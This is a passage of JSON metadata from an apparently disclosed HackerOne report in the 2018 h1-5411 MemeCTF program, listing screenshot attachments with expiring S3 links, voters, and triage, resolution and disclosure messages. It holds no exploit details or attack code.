Z%2BBbcvE%2FzPbIbOkYt%2F4kzBjPA33r7a6gRZo6xBI%2BqcHTUEoZlsC%2FePoA0bzI%2BY%2B9Kn7r266PdCrFtOI0TtLDtrt1a%2FsYB7r39ZReNeBUZjFy71DofxHhuMplWoZ%2B5suYOSkCpnX8ox%2FexG03tPH%2B%2BYi%2B7JKgMNo8Ywg0LUY4FIgqUOY3m9G4vsQ2yNVvhHzc1zFQ%2BaZDinuNqUJycV22%2Bal4yI7Vu8zRPT0XS8nU9mRxPyMOxBhqiEpipRhHvEk6ruVgSYpVrhEqZHRnwv%2FiS2CGZuiFnzVyfzzNc0a1K3NA%2Bqp8X%2FGc2IrCqLgJiIar1EgInaI6d3yXHytJb5boQ1Ym5HsML5oSphvP1hBCFvgtrkpt3teC9sz%2F02EwDEGzubXTtTxqnHBOiqeNpfNEReBvGYlciW1L%2FxLQxgqD5RpQ5CUBnf67bJivw%2BtoZ%2BpV3UvOdvkG99R3Yb6KV5k2Ly3LruRvseHIOA2KILhuT0Arnm9FUq1BvuB593ehUm8src6x4P2nT6wjhA9E2kekyi7othxiuSueSwwyp66qAY6sQGfl2fsTY6VWTPrJHQD%2BPDh1xgsgnaytGIcrwK1OGEf8WVcLpw6bEJ6BKLFS7l9GZDwFvjz7J48x%2Bl7YfFRkEZXRmoO3ak0duYeBuy3U2I6DbXdUZZIWlnrcVoExjgWQHiADxJVCKngMqQP1GNwrY9M5Of5s5Z3zUQwD3EqxVcljRFvNHznFkHj8b2eCVcdpPMI6JyXX4H9nyjUW4XvHJwg%2F0AQay6G%2BksUHKVQvEI2UA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5830fa0ffc48601dca9c659fe58c7c8130fad799e391d1a9fcd9136a03cdcda3",
+      "file_size": 228826,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 352605,
+      "file_name": "Screen_Shot_2018-09-29_at_5.25.19_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/605/d90692d4bf51b4ef86a42c64816b7972e931e29d/Screen_Shot_2018-09-29_at_5.25.19_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-09-29_at_5.25.19_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-09-29_at_5.25.19_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWDIYOMA%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074806Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIFNLdnPGtLwKMqDt0NQfrZo0FnfieCdt70b8x7mZltnYAiEAvoj8eBF%2Fz9RmxiwioQTjaAkY5y8glP7YJHIdVEiSRjIqsgUIKBADGgwwMTM2MTkyNzQ4NDkiDKwmuAj4%2Be1s5lbylSqPBcomyuxhildk0NUANV3%2BftlYYJCWX1M%2B1xqa23Q06%2By7YS%2BQATcLYhjMRKLHIGZfd3bianhW%2FgdFm4gpQAmwDHRw2igbV1zSavkNvXqacnFdw4Oln9SHRd2e4zuwk%2F2GviKwn1nZunhhdOuu6g7A2DA%2FQefyAlyQYpy%2FHRGl7J9kIPlFGlBK9CAul0kzKyTjlygr3Hz7DB5F6X4FcS71gvzmFC%2Fa6bf1tdfq46kICi9nBXV8Yep%2FEmkoi%2FkPVN6jpqZHrrqGL%2BeKOCEw6yXkZefklvRs%2Bmud%2BPdLs6D35uN9GpF0h2lyRl7mI1tGYSVdAxrxhb%2FnLZ%2BBbcvE%2FzPbIbOkYt%2F4kzBjPA33r7a6gRZo6xBI%2BqcHTUEoZlsC%2FePoA0bzI%2BY%2B9Kn7r266PdCrFtOI0TtLDtrt1a%2FsYB7r39ZReNeBUZjFy71DofxHhuMplWoZ%2B5suYOSkCpnX8ox%2FexG03tPH%2B%2BYi%2B7JKgMNo8Ywg0LUY4FIgqUOY3m9G4vsQ2yNVvhHzc1zFQ%2BaZDinuNqUJycV22%2Bal4yI7Vu8zRPT0XS8nU9mRxPyMOxBhqiEpipRhHvEk6ruVgSYpVrhEqZHRnwv%2FiS2CGZuiFnzVyfzzNc0a1K3NA%2Bqp8X%2FGc2IrCqLgJiIar1EgInaI6d3yXHytJb5boQ1Ym5HsML5oSphvP1hBCFvgtrkpt3teC9sz%2F02EwDEGzubXTtTxqnHBOiqeNpfNEReBvGYlciW1L%2FxLQxgqD5RpQ5CUBnf67bJivw%2BtoZ%2BpV3UvOdvkG99R3Yb6KV5k2Ly3LruRvseHIOA2KILhuT0Arnm9FUq1BvuB593ehUm8src6x4P2nT6wjhA9E2kekyi7othxiuSueSwwyp66qAY6sQGfl2fsTY6VWTPrJHQD%2BPDh1xgsgnaytGIcrwK1OGEf8WVcLpw6bEJ6BKLFS7l9GZDwFvjz7J48x%2Bl7YfFRkEZXRmoO3ak0duYeBuy3U2I6DbXdUZZIWlnrcVoExjgWQHiADxJVCKngMqQP1GNwrY9M5Of5s5Z3zUQwD3EqxVcljRFvNHznFkHj8b2eCVcdpPMI6JyXX4H9nyjUW4XvHJwg%2F0AQay6G%2BksUHKVQvEI2UA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9e796ca2a843d90dcc565cb32af255055eeaf36fe3189e64255832e1f5500bf9",
+      "file_size": 149333,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 352614,
+      "file_name": "Screen_Shot_2018-09-29_at_6.03.01_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/614/2e2523c5ec929ec4e70ca56ea6d7100bcceb1a2b/Screen_Shot_2018-09-29_at_6.03.01_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-09-29_at_6.03.01_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-09-29_at_6.03.01_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWDIYOMA%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074806Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIFNLdnPGtLwKMqDt0NQfrZo0FnfieCdt70b8x7mZltnYAiEAvoj8eBF%2Fz9RmxiwioQTjaAkY5y8glP7YJHIdVEiSRjIqsgUIKBADGgwwMTM2MTkyNzQ4NDkiDKwmuAj4%2Be1s5lbylSqPBcomyuxhildk0NUANV3%2BftlYYJCWX1M%2B1xqa23Q06%2By7YS%2BQATcLYhjMRKLHIGZfd3bianhW%2FgdFm4gpQAmwDHRw2igbV1zSavkNvXqacnFdw4Oln9SHRd2e4zuwk%2F2GviKwn1nZunhhdOuu6g7A2DA%2FQefyAlyQYpy%2FHRGl7J9kIPlFGlBK9CAul0kzKyTjlygr3Hz7DB5F6X4FcS71gvzmFC%2Fa6bf1tdfq46kICi9nBXV8Yep%2FEmkoi%2FkPVN6jpqZHrrqGL%2BeKOCEw6yXkZefklvRs%2Bmud%2BPdLs6D35uN9GpF0h2lyRl7mI1tGYSVdAxrxhb%2FnLZ%2BBbcvE%2FzPbIbOkYt%2F4kzBjPA33r7a6gRZo6xBI%2BqcHTUEoZlsC%2FePoA0bzI%2BY%2B9Kn7r266PdCrFtOI0TtLDtrt1a%2FsYB7r39ZReNeBUZjFy71DofxHhuMplWoZ%2B5suYOSkCpnX8ox%2FexG03tPH%2B%2BYi%2B7JKgMNo8Ywg0LUY4FIgqUOY3m9G4vsQ2yNVvhHzc1zFQ%2BaZDinuNqUJycV22%2Bal4yI7Vu8zRPT0XS8nU9mRxPyMOxBhqiEpipRhHvEk6ruVgSYpVrhEqZHRnwv%2FiS2CGZuiFnzVyfzzNc0a1K3NA%2Bqp8X%2FGc2IrCqLgJiIar1EgInaI6d3yXHytJb5boQ1Ym5HsML5oSphvP1hBCFvgtrkpt3teC9sz%2F02EwDEGzubXTtTxqnHBOiqeNpfNEReBvGYlciW1L%2FxLQxgqD5RpQ5CUBnf67bJivw%2BtoZ%2BpV3UvOdvkG99R3Yb6KV5k2Ly3LruRvseHIOA2KILhuT0Arnm9FUq1BvuB593ehUm8src6x4P2nT6wjhA9E2kekyi7othxiuSueSwwyp66qAY6sQGfl2fsTY6VWTPrJHQD%2BPDh1xgsgnaytGIcrwK1OGEf8WVcLpw6bEJ6BKLFS7l9GZDwFvjz7J48x%2Bl7YfFRkEZXRmoO3ak0duYeBuy3U2I6DbXdUZZIWlnrcVoExjgWQHiADxJVCKngMqQP1GNwrY9M5Of5s5Z3zUQwD3EqxVcljRFvNHznFkHj8b2eCVcdpPMI6JyXX4H9nyjUW4XvHJwg%2F0AQay6G%2BksUHKVQvEI2UA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=209d7585f7c4938d3a1a82e7c6792b9721fc7422c0ad57fd1b1f8769c9e8ebed",
+      "file_size": 174467,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 352616,
+      "file_name": "Screen_Shot_2018-09-29_at_6.05.08_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/616/c8cbcabe4ee1424eea8ae8d1dc8d0b5ded600487/Screen_Shot_2018-09-29_at_6.05.08_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-09-29_at_6.05.08_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-09-29_at_6.05.08_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWDIYOMA%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074806Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIFNLdnPGtLwKMqDt0NQfrZo0FnfieCdt70b8x7mZltnYAiEAvoj8eBF%2Fz9RmxiwioQTjaAkY5y8glP7YJHIdVEiSRjIqsgUIKBADGgwwMTM2MTkyNzQ4NDkiDKwmuAj4%2Be1s5lbylSqPBcomyuxhildk0NUANV3%2BftlYYJCWX1M%2B1xqa23Q06%2By7YS%2BQATcLYhjMRKLHIGZfd3bianhW%2FgdFm4gpQAmwDHRw2igbV1zSavkNvXqacnFdw4Oln9SHRd2e4zuwk%2F2GviKwn1nZunhhdOuu6g7A2DA%2FQefyAlyQYpy%2FHRGl7J9kIPlFGlBK9CAul0kzKyTjlygr3Hz7DB5F6X4FcS71gvzmFC%2Fa6bf1tdfq46kICi9nBXV8Yep%2FEmkoi%2FkPVN6jpqZHrrqGL%2BeKOCEw6yXkZefklvRs%2Bmud%2BPdLs6D35uN9GpF0h2lyRl7mI1tGYSVdAxrxhb%2FnLZ%2BBbcvE%2FzPbIbOkYt%2F4kzBjPA33r7a6gRZo6xBI%2BqcHTUEoZlsC%2FePoA0bzI%2BY%2B9Kn7r266PdCrFtOI0TtLDtrt1a%2FsYB7r39ZReNeBUZjFy71DofxHhuMplWoZ%2B5suYOSkCpnX8ox%2FexG03tPH%2B%2BYi%2B7JKgMNo8Ywg0LUY4FIgqUOY3m9G4vsQ2yNVvhHzc1zFQ%2BaZDinuNqUJycV22%2Bal4yI7Vu8zRPT0XS8nU9mRxPyMOxBhqiEpipRhHvEk6ruVgSYpVrhEqZHRnwv%2FiS2CGZuiFnzVyfzzNc0a1K3NA%2Bqp8X%2FGc2IrCqLgJiIar1EgInaI6d3yXHytJb5boQ1Ym5HsML5oSphvP1hBCFvgtrkpt3teC9sz%2F02EwDEGzubXTtTxqnHBOiqeNpfNEReBvGYlciW1L%2FxLQxgqD5RpQ5CUBnf67bJivw%2BtoZ%2BpV3UvOdvkG99R3Yb6KV5k2Ly3LruRvseHIOA2KILhuT0Arnm9FUq1BvuB593ehUm8src6x4P2nT6wjhA9E2kekyi7othxiuSueSwwyp66qAY6sQGfl2fsTY6VWTPrJHQD%2BPDh1xgsgnaytGIcrwK1OGEf8WVcLpw6bEJ6BKLFS7l9GZDwFvjz7J48x%2Bl7YfFRkEZXRmoO3ak0duYeBuy3U2I6DbXdUZZIWlnrcVoExjgWQHiADxJVCKngMqQP1GNwrY9M5Of5s5Z3zUQwD3EqxVcljRFvNHznFkHj8b2eCVcdpPMI6JyXX4H9nyjUW4XvHJwg%2F0AQay6G%2BksUHKVQvEI2UA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=882de66bd7bde9ce5d5fde89130d8e2be747f2110b653aca44ee21723e318a79",
+      "file_size": 266848,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-11-07T16:25:21.795Z",
+  "allow_singular_disclosure_after": -153847364.8374368,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "0xacb",
+    "sameerphad72",
+    "spam404",
+    "leonishan",
+    "ali",
+    "leetboi",
+    "eveeez",
+    "japz",
+    "spetr0x",
+    "rewanth_cool",
+    "and 1 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 3404973,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "We are excited to inform you that we are opening participation in h1-5411 to entire teams and to virtual participants! Please keep an eye on your email for your invite to the program!\n\nBest of luck and happy hacking!",
+      "automated_response": false,
+      "created_at": "2018-09-29T02:02:58.602Z",
+      "updated_at": "2018-09-29T02:06:41.470Z",
+      "actor": {
+        "username": "nahamsec",
+        "cleared": true,
+        "verified": true,
+        "url": "/nahamsec",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "h1-5411-ctf"
+    },
+    {
+      "id": 3449284,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hello @lolwaleet,\n\nI'm closing this report now as resolved.\nFeel free to request public disclosure and publish a writeup on your blog!\n\nBest regards,\nAndré",
+      "automated_response": false,
+      "created_at": "2018-10-08T16:20:19.717Z",
+      "updated_at": "2018-10-08T16:20:19.717Z",
+      "actor": {
+        "username": "0xacb",
+        "cleared": true,
+        "verified": true,
+        "url": "/0xacb",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/hgbi683nnn5y6d0kxto7a9unt4fk/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "leetboi",
+        "url": "/leetboi"
+      },
+      "genius_execution_id": null,
+      "team_handle": "h1-5411-ctf"
+    },
+    {
+      "id": 3449306,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-10-08T16:25:21.767Z",
+      "updated_at": "2018-10-08T16:25:21.767Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "leetboi",
+        "cleared": false,
+        "verified": false,
+        "url": "/leetboi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/198/715/a6af554d03396e57751d92e755289546d40ada21_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "h1-5411-ctf"
+    },
+    {
+      "id": 3449312,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank You!",
+      "automated_response": false,
+      "created_at": "2018-10-08T16:26:10.222Z",
+      "updated_at": "2018-10-08T16:26:10.222Z",
+      "actor": {
+        "username": "leetboi",
+        "cleared": false,
+        "verified": false,
+        "url": "/leetboi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/198/715/a6af554d03396e57751d92e755289546d40ada21_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "h1-5411-ctf"
+    },
+    {
+      "id": 3514752,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "We would like to publicly disclose your submission. Thanks again for participating in the MemeCTF Challenge. ",
+      "automated_response": false,
+      "created_at": "2018-10-22T16:01:52.475Z",
+      "updated_at": "2018-10-22T16:01:52.475Z",
+      "actor": {
+        "username": "nahamsec",
+        "cleared": true,
+        "verified": true,
+        "url": "/nahamsec",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "h1-5411-ctf"
+    },
+    {
+      "id": 3514753,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-10-22T16:01:52.546Z",
+      "updated_at": "2018-10-22T16:01:52.546Z",
+      "actor": {
+        "username": "nahamsec",
+        "cleared": true,
+        "verified": true,
+        "url": "/nahamsec",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "h1-5411-ctf"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
